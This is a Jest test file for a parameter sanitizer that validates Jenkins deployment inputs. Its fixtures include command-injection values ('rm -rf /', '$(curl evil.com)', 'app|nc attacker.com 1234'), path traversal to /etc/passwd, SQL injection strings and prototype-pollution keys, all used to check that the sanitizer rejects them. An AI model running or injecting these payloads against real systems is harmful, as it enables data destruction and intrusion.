import { jest, describe, it, expect, beforeEach } from '@jest/globals';
import { ParameterSanitizer } from '../../../src/utils/parameter-sanitizer';

// Mock logger
jest.mock('../../../src/utils/logger', () => ({
  logger: () => ({
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
  }),
}));

describe('ParameterSanitizer', () => {
  let sanitizer: ParameterSanitizer;

  beforeEach(() => {
    sanitizer = new ParameterSanitizer();
  });

  describe('sanitizeParameters', () => {
    it('should sanitize valid parameters successfully', () => {
      // Arrange
      const parameters = {
        branch: 'main',
        environment: 'production',
        version: '1.2.3',
        app_name: 'my-app'
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.sanitized).toEqual({
        branch: 'main',
        environment: 'production',
        version: '1.2.3',
        app_name: 'my-app'
      });
      expect(result.warnings).toHaveLength(0);
      expect(result.rejected).toEqual({});
    });

    it('should reject parameters not in whitelist', () => {
      // Arrange
      const parameters = {
        branch: 'main',
        malicious_param: 'rm -rf /',
        another_bad_param: '$(curl evil.com)'
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.sanitized).toEqual({ branch: 'main' });
      expect(result.rejected).toEqual({
        malicious_param: 'rm -rf /',
        another_bad_param: '$(curl evil.com)'
      });
      expect(result.warnings).toContain('Parameter \'malicious_param\' rejected: Parameter not in whitelist');
      expect(result.warnings).toContain('Parameter \'another_bad_param\' rejected: Parameter not in whitelist');
    });

    it('should handle command injection attempts', () => {
      // Arrange
      const parameters = {
        branch: 'main; rm -rf /',
        environment: 'production && curl evil.com',
        version: '1.0.0`whoami`',
        app_name: 'app|nc attacker.com 1234'
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.rejected.branch).toBeDefined(); // Contains semicolon - rejected
      expect(result.rejected.environment).toBeDefined(); // Invalid environment value
      expect(result.rejected.version).toBeDefined(); // Invalid version format
      expect(result.rejected.app_name).toBeDefined(); // Contains pipe character
    });

    it('should prevent path traversal attacks', () => {
      // Arrange
      const parameters = {
        config_file: '../../../etc/passwd',
        branch: 'main/../../../sensitive-data',
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.sanitized.config_file).toBe('etc/passwd'); // Path traversal removed
      expect(result.sanitized.branch).toBe('main/sensitive-data'); // Path traversal removed
    });

    it('should handle SQL injection attempts', () => {
      // Arrange
      const parameters = {
        branch: "main'; DROP TABLE users; --",
        app_name: "app' OR '1'='1"
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.rejected.branch).toBeDefined(); // Contains semicolon and quotes - rejected
      expect(result.rejected.app_name).toBeDefined(); // Contains quotes and SQL
    });

    it('should remove control characters and normalize whitespace', () => {
      // Arrange
      const parameters = {
        branch: 'main\x00\x1f\r\n\ttest',
        app_name: 'my\r\napp\t\twith   spaces'
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.rejected.branch).toBeDefined(); // Contains control chars - likely rejected by pattern
      expect(result.rejected.app_name).toBeDefined(); // Contains spaces - rejected by app_name pattern
    });

    it('should enforce parameter length limits', () => {
      // Arrange
      const longString = 'a'.repeat(300);
      const parameters = {
        branch: longString,
        app_name: 'valid-app'
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.rejected.branch).toBe(longString);
      expect(result.sanitized.app_name).toBe('valid-app');
      expect(result.warnings).toContain('Parameter \'branch\' rejected: Invalid parameter value format');
    });

    it('should enforce parameter count limits', () => {
      // Arrange
      const parameters: Record<string, string> = {};
      // Create more parameters than the limit (20)
      for (let i = 1; i <= 25; i++) {
        parameters[`branch${i}`] = `value${i}`;
      }

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(Object.keys(result.sanitized).length).toBeLessThanOrEqual(20);
      expect(result.warnings.some(w => w.includes('Too many parameters'))).toBe(true);
    });

    it('should validate environment parameter values', () => {
      // Arrange
      const parameters = {
        environment: 'invalid-env',
        branch: 'main'
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.rejected.environment).toBe('invalid-env');
      expect(result.sanitized.branch).toBe('main');
    });

    it('should validate version format', () => {
      // Arrange
      const parameters = {
        version: '1.2.3-beta.1',
        branch: 'main'
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.sanitized.version).toBe('1.2.3-beta.1');
      expect(result.sanitized.branch).toBe('main');
    });

    it('should reject invalid version formats', () => {
      // Arrange
      const parameters = {
        version: 'not-a-version',
        branch: 'main'
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.rejected.version).toBe('not-a-version');
      expect(result.sanitized.branch).toBe('main');
    });

    it('should handle null and undefined values', () => {
      // Arrange
      const parameters = {
        branch: null,
        environment: undefined,
        version: '',
        app_name: 'valid-app'
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.rejected.branch).toBeDefined(); // null rejected  
      expect(result.rejected.environment).toBeDefined(); // undefined rejected
      expect(result.rejected.version).toBeDefined(); // empty string may be rejected
      expect(result.sanitized.app_name).toBe('valid-app');
    });

    it('should reject object and array values', () => {
      // Arrange
      const parameters = {
        branch: 'main',
        malicious_object: { evil: 'code' },
        malicious_array: ['rm', '-rf', '/']
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.sanitized.branch).toBe('main');
      expect(result.rejected.malicious_object).toBeDefined();
      expect(result.rejected.malicious_array).toBeDefined();
    });

    it('should sanitize parameter names', () => {
      // Arrange
      const parameters = {
        'Branch Name!': 'main',
        '  App-Name  ': 'my-app',
        '123invalid': 'value'
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.rejected['Branch Name!']).toBeDefined();
      expect(result.rejected['  App-Name  ']).toBeDefined();
      expect(result.rejected['123invalid']).toBeDefined();
    });
  });

  describe('validateForJenkins', () => {
    it('should validate safe parameters', () => {
      // Arrange
      const parameters = {
        branch: 'main',
        environment: 'production'
      };

      // Act
      const result = sanitizer.validateForJenkins(parameters);

      // Assert
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject empty parameter set', () => {
      // Arrange
      const parameters = {};

      // Act
      const result = sanitizer.validateForJenkins(parameters);

      // Assert
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('No valid parameters remaining after sanitization');
    });

    it('should enforce production branch restrictions', () => {
      // Arrange
      const parameters = {
        environment: 'production',
        branch: 'feature-branch'
      };

      // Act
      const result = sanitizer.validateForJenkins(parameters);

      // Assert
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Production deployments must use main/master branch');
    });

    it('should detect remaining dangerous expressions', () => {
      // Arrange
      const parameters = {
        branch: 'test$(echo dangerous)',
        app_name: 'app${malicious}'
      };

      // Act
      const result = sanitizer.validateForJenkins(parameters);

      // Assert
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('potentially dangerous expressions'))).toBe(true);
    });

    it('should detect dangerous commands', () => {
      // Arrange
      const parameters = {
        branch: 'main',
        app_name: 'curl-downloader'
      };

      // Act
      const result = sanitizer.validateForJenkins(parameters);

      // Assert
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('potentially dangerous commands'))).toBe(true);
    });

    it('should allow main branch for production', () => {
      // Arrange
      const parameters = {
        environment: 'production',
        branch: 'main'
      };

      // Act
      const result = sanitizer.validateForJenkins(parameters);

      // Assert
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should allow master branch for production', () => {
      // Arrange
      const parameters = {
        environment: 'production',
        branch: 'master'
      };

      // Act
      const result = sanitizer.validateForJenkins(parameters);

      // Assert
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });
  });

  describe('getAllowedParameters', () => {
    it('should return sorted list of allowed parameters', () => {
      // Act
      const allowed = sanitizer.getAllowedParameters();

      // Assert
      expect(allowed).toContain('branch');
      expect(allowed).toContain('environment');
      expect(allowed).toContain('version');
      expect(allowed).toContain('app_name');
      expect(allowed).toEqual(allowed.sort()); // Should be sorted
    });
  });

  describe('Edge cases and security tests', () => {
    it('should handle unicode and special encoding attempts', () => {
      // Arrange
      const parameters = {
        branch: 'main\u0000\u202E', // Null byte and RTL override
        app_name: 'app\u2028\u2029' // Line/paragraph separators
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.rejected.branch).toBeDefined(); // Contains unicode control chars - rejected
      expect(result.sanitized.app_name).toBe('app'); // Unicode separators removed, should be sanitized
    });

    it('should handle mixed case parameter names', () => {
      // Arrange
      const parameters = {
        'BRANCH': 'main',
        'App_Name': 'my-app'
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.sanitized.branch).toBe('main');
      expect(result.sanitized.app_name).toBe('my-app');
    });

    it('should prevent prototype pollution attempts', () => {
      // Arrange
      const parameters = {
        '__proto__': 'malicious',
        'constructor': 'evil',
        branch: 'main'
      };

      // Act
      const result = sanitizer.sanitizeParameters(parameters);

      // Assert
      expect(result.sanitized.branch).toBe('main');
      expect(result.rejected['__proto__']).toBeDefined();
      expect(result.rejected['constructor']).toBeDefined();
    });
  });
});